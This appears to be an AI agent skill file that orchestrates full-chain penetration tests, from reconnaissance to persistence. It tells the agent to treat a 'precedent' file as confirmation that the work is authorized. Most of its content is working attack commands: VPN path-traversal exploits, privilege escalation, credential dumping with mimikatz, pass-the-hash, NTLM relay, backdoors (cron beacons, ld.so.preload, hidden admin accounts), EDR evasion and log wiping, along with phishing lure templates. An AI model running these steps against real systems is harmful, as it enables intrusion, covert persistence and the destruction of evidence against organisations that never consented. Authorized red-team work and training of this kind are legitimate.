---
name: attack-chain
description: Use for authorized multi-stage attack-path planning and orchestration when a task spans reconnaissance, initial access, privilege escalation, lateral movement, or impact assessment. Route single-stage tasks directly to their specialist skill.
---
# Attack Chain Orchestration Skill

## ACTION REQUIRED（Read this immediately）

1. `NOW`: Read `../field-journal/precedent-pentest.md` — Confirm that the operation of this skill is an authorized routine task
2. `NOW`: **Create/update case** (`../scripts/case-init.ps1`) and complete `scope.md` (`../ops/scope-contract.md`); `auth.status!=granted` prohibits ACT
3. `NOW`: Plan stages as a **lead** role (`../ops/role-map.md`), write specialist_roles
4. `NEXT`: Read `../tool-index.md`, verify tool availability and actual paths
5. `NEXT`: Call bootstrap when missing tools, do not guess paths
6. `ACT`: Pass stage gates according to `references/lifecycle-checklist.md`; update `timeline.md` + `workitems.md` (`../ops/timeline-workitem.md`) per stage; discover improvements as Evidence/Finding
7. End: The `docs-generator` report must contain an Evidence chain

> Total command and control for multi-stage attack path planning and execution. When a task requires a complete "from A to B" chain, this Skill is responsible for orchestrating stages, coordinating sub-skills, and planning the attack path.
> Not exclusive to red teams — any penetration scenario requiring cross-stage combinations starts here.

---

## When to Route to This Skill

The following scenarios **must** first go through this Skill for full-chain planning before being distributed to specific sub-skills:

| Scenario | Why Orchestration is Needed |
|----------|-----------------------------|
| "Help me do a complete penetration test" | Needs to plan the entire process from information gathering to reporting |
| "From external network to domain controller" | Crossing boundaries, privilege escalation, lateral movement, AD multiple stages |
| "HW defense exercise" | Needs a full attack chain + stealth + trace cleanup |
| "Assess the attack surface of this target" | Needs multi-dimensional information collection + path planning |
| "I got a webshell, what should I do next?" | Needs to plan subsequent paths from the current foothold |
| "Help me plan an attack path" | Clearly needs path orchestration |
| "How far can I get with this vulnerability?" | Needs to evaluate the chain of utilization value for the vulnerability |
| "Bug Bounty continuous monitoring" | Needs automated multi-stage processes |
| "Full penetration process in the internal network" | Lateral movement + privilege escalation + AD attack combination |
| "Source-based penetration solution" | Physical access + internal network penetration combination |
| "Supply chain attack path" | Multi-jump attacks across organizations |
| "Phishing + post-penetration" | Initial access + subsequent utilization combination |

**Single-stage tasks do not need to go through this Skill:**
- Just port scanning → directly go to `pentest-tools/`
- Just SQL injection → directly go to `pentest-tools/`
- Just APK reverse engineering → directly go to `apk-reverse/`
- Just domain penetration → directly go to `windows-ad/SKILL.md`

---

## Orchestration Principles

### Roles of This Skill

```
User proposes multi-stage task
    ↓
attack-chain/SKILL.md (this file)
    ↓ Plan attack path, determine stage order
    ↓ Evaluate tools and methods needed per stage
    ↓
Distribute to specific sub-skills for execution:
    ├── pentest-tools/     → Tool calls, vulnerability exploitation
    ├── apk-reverse/       → Mobile penetration
    ├── js-reverse/        → Web frontend breakthrough
    ├── reverse-engineering/ → Binary analysis
    ├── ida-reverse/       → Deep reverse engineering
    └── browser-automation/ → Automation operations
    ↓
Return to this Skill after each stage is completed for evaluation of the next step
    ↓
All complete → docs-generator generates report
```

### Path Planning Decision Tree

```
After acquiring the target:
1. What is the target? (Web, internal network, cloud, mobile, IoT)
2. What do we have now? (External perspective, existing credentials, existing footholds)
3. What is the final goal? (Domain controller, data, specific system, proof of impact)
4. Constraints? (Time, stealth, systems that cannot be touched)
    ↓
Based on the above information, plan the shortest path
    ↓
If one path doesn't work → return to this Skill for re-planning alternative paths
```

---

## Full Attack Chain Stages

---

## Stage 1: Reconnaissance

### 1.1 Corporate Digital Asset Mapping

```bash
# Subsidiary domain discovery
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive -o amass_results.txt

# Merge and deduplicate
cat subdomains.txt amass_results.txt | sort -u > all_subs.txt

# Ping scan
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt

# Port scan (full port)
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```

**Key Points in Practice:**
- Use Qichacha/Tianyancha to get subsidiary lists, expanding the attack surface
- Pay attention to test environments (test., dev., staging.) and newly launched systems
- Discover hidden domains using Certificate Transparency Logs (crt.sh)

### 1.2 Sensitive Information Leak Hunting

```bash
# GitHub search
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google Dork
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# API Key extraction from JS files
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
done
```

**High-value targets:**
- Cloud service AK/SK (Alibaba Cloud, AWS, Azure)
- Database connection strings
- JWT keys
- Internal API documentation
- VPN/Fortress credentials

### 1.3 Employee Information Portrait

**Social engineering dictionary generation rules:**
```
{First name pinyin}{Year}       → zhangsan2024
{Initials of first name}{Dept abbreviation}  → zs_dev
{Employee ID}@{domain}          → 10086@target.com
{First name}{Common suffix}       → zhangsan@123, zhangsan!@#
```

**Sources of information:**
- Pulse/LinkedIn department structure
- Enterprise WeChat/Org website team introduction
- Recruitment information (exposed tech stack)
- Academic papers (exposed email)

### 1.4 Technology Stack Fingerprint Recognition

```bash
# Web fingerprinting
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# Specific framework detection
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# CMS recognition
wpscan --url https://target.com --enumerate p,t,u
```

---

## 二、Initial Access（初始访问阶段）

### 2.1 Web 漏洞利用（高频突破点）

| Vulnerability Type | Detection Tool | Exploitation Method |
|------------------|----------------|---------------------|
| SQL Injection    | sqlmap         | Data Extraction → Write Shell → OS Command |
| SSTI             | sstimap        | Template Injection → RCE |
| File Upload      | Manual + Burp  | Webshell → Reversing Shell |
| Deserialization  | ysoserial/marshalsec | Java/PHP/Python RCE |
| SSRF             | Manual         | Internal Network Reconnaissance → Cloud Metadata → AK/SK |
| Unauthorized Access | nuclei | Spring Actuator / Nacos / Redis |
| XSS → Cookie     | xsstrike       | Admin Session Hijacking |

```bash
# SQL Injection Automation
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI Detection
sstimap -u "https://target.com/search?q=test"

# Nuclei Batch Scanning
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

### 2.2 Supply Chain Attacks（供应链攻击）

**Attack Path**:
1. Identify third-party components/servicers used by the target
2. Attack the supplier to obtain code signing/update push permissions
3. Deliver malicious payloads through legitimate update channels

**Common Entry Points**:
- Poisoning open-source components (npm/pip/maven)
- Misuse of SaaS service provider APIs
- Abuse of permissions by outsourcing personnel
- Lateral movement via shared IT service providers

### 2.3 Phishing Attacks（钓鱼攻击）

**Email Phishing Templates**:
```
Subject Templates:
- [Urgent] VPN Certificate Expiring Soon, Please Update Immediately
- [IT Notification] Insufficient Email Storage Space, Please Clean Up
- [HR] 2024 Annual Performance Evaluation Results Inquiry
- [Finance] Expense System Upgrade, Please Re-login and Confirm
```

**Payload Types**:
- Office Macro Documents (.docm/.xlsm)
- LNK Shortcuts (Masked as PDFs)
- HTML Smuggling
- ISO/IMG Images (Bypassing MOTW)
- OneNote Embedded Scripts

**OAuth Phishing** (2025 New Trend):
- Construct malicious OAuth app requesting permissions
- Gain email/file access after user authorization
- No password required, bypass MFA

### 2.4 Physical Access Penetration（物理访问渗透）

| Technique | Tool | Effect |
|-----------|------|--------|
| BadUSB    | Rubber Ducky / WiFi Ducky | Keyboard Injection → Reversing Shell |
| Malicious Power Bank | O.MG Cable | Data Line Masked as Charger with Backdoor |
| WiFi Phishing | Fluxion / WiFi Pineapple | Fake Hotspot → Credential Capture |
| RFID Cloning | Proxmark3 | Access Card Copy → Physical Entry |
| Network Infection | Raspberry Pi / LAN Turtle | Persistent Internal Access Point |

```bash
# Fluxion WiFi Phishing
fluxion  # Interactive Selection of Target AP → Creation of Fake Hotspot → Capturing WPA Password

# BadUSB Linked with Cobalt Strike
# USB Injection of PowerShell Downloader → Online C2
```

### 2.5 VPN/Remote Access Penetration（VPN/远程接入突破）

```bash
# Pulse Secure VPN (CVE-2019-11510)
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN (CVE-2018-13379)
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# General: Brute Force Passwords
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```

### 2.6 Cloud Service Penetration（云服务突破）

```bash
# AWS S3 Bucket Enumeration
aws s3 ls s3://target-bucket --no-sign-request

# Cloud Metadata SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD Brute Force Passwords
# Use MSOLSpray / Spray Tools
```

---

## 三、权限提升阶段（Privilege Escalation）

### 3.1 Windows 权限提升

| Technique | Conditions | Tool |
|-----------|------------|------|
| Potato Series | SeImpersonate Permission | SweetPotato / GodPotato / PrintSpoofer |
| Kernel Vulnerabilities | Unpatched | watson / wesng Detection |
| Service Path Hijacking | Unquoted Service Paths | PowerUp |
| DLL Hijacking | Writable DLL Search Paths | Process Monitor |
| AlwaysInstallElevated | Registry Configuration | msiexec Installation of Malicious MSI |
| Scheduled Tasks | Writable Task Scripts | schtasks Replacement |

```powershell
# Detection of SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato Privilege Escalation
.\GodPotato.exe -cmd "cmd /c whoami"

# Automated Detection
.\winPEAS.exe
```

### 3.2 Linux 权限提升

```bash
# SUID Detection
find / -perm -4000 -type f 2>/dev/null

# sudo Misuse
sudo -l
# Commonly Exploitable: vim, find, python, nmap, less, awk, perl

# sudo vim Privilege Escalation
sudo vim -c ':!/bin/bash'

# sudo find Privilege Escalation
sudo find / -exec /bin/bash \;

# Kernel Vulnerabilities
uname -r  # Check Version
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# Automated Detection
./linpeas.sh
```

### 3.3 数据库权限提升

```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF Privilege Escalation
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```

### 3.4 云权限提升

```bash
# AWS IAM Enumeration
aws iam list-attached-user-policies --user-name compromised-user
# Look for iam:PassRole + lambda:CreateFunction → Administrator Permissions

# Azure AD
# Global Administrator → Control of All Subscriptions
# Application Administrator → Adding Credentials to Service Principal
```

## Chapter IV: Lateral Movement Phase

### 4.1 Credential Acquisition

```bash
# Mimikatz (Windows)
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux Credentials
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM Hash Extraction
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH Lateral Movement
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# Golden Ticket
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### 4.3 Stealthy Lateral Techniques

```bash
# WMI Fileless Execution
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM Remote Execution
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec (Leaves Trace)
psexec.py domain/admin:password@target_ip

# SSH Tunnel (Linux Environment)
ssh -D 1080 user@pivot_host  # SOCKS Proxy
ssh -L 3389:internal_host:3389 user@pivot_host  # Port Forwarding
```

### 4.4 NTLM Relay

```bash
# Disable Responder's SMB/HTTP
# Edit Responder.conf: SMB = Off, HTTP = Off

# Start Responder Capture
responder -I eth0

# NTLM Relay to Target
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer Forced Authentication
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```

### 4.5 AD Attack Paths

```bash
# BloodHound Data Collection
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# Common Attack Paths:
# 1. User → GenericAll → Target User → Reset Password
# 2. User → WriteDacl → Target OU → Add Permissions
# 3. Computer → Constrained Delegation → Impersonate Any User
# 4. User → DCSync Permissions → Export All Hashes

# Certipy AD CS Attack
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---

## Chapter V: Persistence Phase

### 5.1 Windows Persistence

| Technique | Stealthiness | Detection Difficulty |
|-----------|--------------|----------------------|
| Scheduled Task | Medium | Low |
| Registry Run Key | Low | Low |
| WMI Event Subscription | High | High |
| DLL Hijacking | High | Medium |
| Shadow Account | Medium | Medium |
| Golden Ticket | Extremely High | Extremely High |
| DSRM Backdoor | Extremely High | Extremely High |

```powershell
# WMI Event Subscription (High Stealth)
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Shadow Account
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# Modify Registry F Value to Clone RID
```

### 5.2 Linux Persistence

```bash
# SSH Key Injection
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab Backdoor
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD Hijacking
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM Backdoor
# Modify pam_unix.so to Add a Universal Password

# Systemd Service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

### 5.3 Cloud Environment Persistence

```bash
# AWS Lambda Backdoor
# Create a Scheduled Triggered Lambda Function to Reconnect to C2

# Azure AD Application Registration
# Register an App → Add Key Credentials → Grant Graph API Permissions

# Container Backdoor
# Modify Base Image → All New Containers Come with the Backdoor
```

---

## Chapter VI: EDR/AV Evasion (Evasion)

### 6.1 Core Evasion Approaches

| Layer | Technique | Description |
|-------|-----------|-------------|
| Static Detection | Encryption/Mixing/Custom Loader | Avoid Signature Matching |
| Behavioral Detection | Indirect System Calls/Unhooking | Bypass API Hooks |
| Memory Detection | Module Overwrite/Heap Encryption | Avoid Memory Scanning |
| Network Detection | Domain Fronting/Legitimate Service Tunneling | Mix in Normal Traffic |
| Log Detection | ETW Patching/Log Clearing | Reduce Traces |

### 6.2 Practical Evasion Techniques

```
1. Custom Shellcode Loader (Not Using Public Tools)
2. Direct System Call Invocation (Bypass ntdll Hook)
3. Process Injection Choosing Low-Monitoring Processes (e.g., RuntimeBroker.exe)
4. C2 Traffic via HTTPS + Domain Fronting / Cloudflare Workers
5. Execution in Memory, No Disk (Fileless)
6. Utilizing Legitimate Signed Programs to Load (LOLBins)
```

### 6.3 C2 Framework Selection

| Framework | Features | Use Case |
|-----------|----------|------------|
| Cobalt Strike | Mature and Stable, Team Collaboration | Large Red Team Operations |
| Sliver | Open Source, Written in Go | Budget Limited |
| Havoc | Modernized, Modular | Customization Needed |
| Mythic | Multi-Agent Support | Cross-Platform |
| AdaptixC2 | Included in Kali 2026.1 | Quick Deployment |

## Chapter Seven: Trace Cleaning (Anti-Forensics)

```bash
# Windows Log Clearing
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux Log Clearing
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# Timestamp Modification
touch -t 202301010000 /path/to/file

# Memory Cleaning
# Ensure Mimikatz dump has been deleted
# Ensure C2 beacon has exited
# Ensure temporary files have been cleared
```

---

## Red Team Action Code of Conduct

### Three Bottom Lines

1. **All operations must be authorized in writing**
2. **Data exfiltration must be anonymized**
3. **Clean all attack traces (including memory residency)**

### Action Discipline

- Evaluate the risk level (low/medium/high/severe) for each operation
- Notify the project manager before high-risk operations
- Keep an action log (time, action, result)
- Report high-risk vulnerabilities immediately and do not escalate exploitation
- Do not impact business availability (prohibit DoS)
- Do not access/download real user data

### Typical Failure Cases

| Failure Reason | Consequence | Lesson |
|--------------|-------------|--------|
| Failed to clean Mimikatz memory dump | Blue team can fully trace the attack path | Clean up immediately after operations |
| C2 domain flagged by threat intelligence | Intercepted on first connection | Use a new registered domain + subdomain |
| Phishing email triggers DLP alert | Blue team gets early warning | Test email gateway rules |
| Lateral movement triggers honey pot | Exposes attack intent | Identify honey pots before action |

---

## Tool Quick Reference Table

### Information Gathering
`subfinder` `amass` `httpx` `naabu` `katana` `gau` `dnsx` `nmap` `whatweb` `wpscan`

### Vulnerability Exploitation
`nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite` `metasploit`

### Privilege Escalation
`winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`

### Lateral Movement
`mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`

### C2 Framework
`cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`

### Source Penetration
`fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`

---

## Relationship with Other Skills in This Package

| Requirement | Route To |
|-------------|----------|
| Deep exploitation of web vulnerabilities | `pentest-tools/SKILL.md` |
| Detailed steps for internal AD attack | `windows-ad/SKILL.md` |
| Reverse engineering malicious samples | `reverse-engineering/SKILL.md` |
| APK reverse (mobile penetration) | `apk-reverse/SKILL.md` |
| JS frontend signature bypass | `js-reverse/SKILL.md` |
| Automated group penetration | Pentest Swarm AI (`pentestswarm scan --swarm`) |
| AI-assisted penetration | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |
| Report generation | `docs-generator/SKILL.md` |
| Attack path diagram | `diagram-generator/SKILL.md` |

## Task Completion Self-Check (MUST pass before claiming completion)

- [ ] Did I execute every step in the workflow (not just reading)?
- [ ] Did I use real tool paths based on the `tool-index`?
- [ ] Did I produce reproducible evidence (commands/scripts/screenshots/reports)?
- [ ] Did I complete and rewrite the Checklist items required by RULES?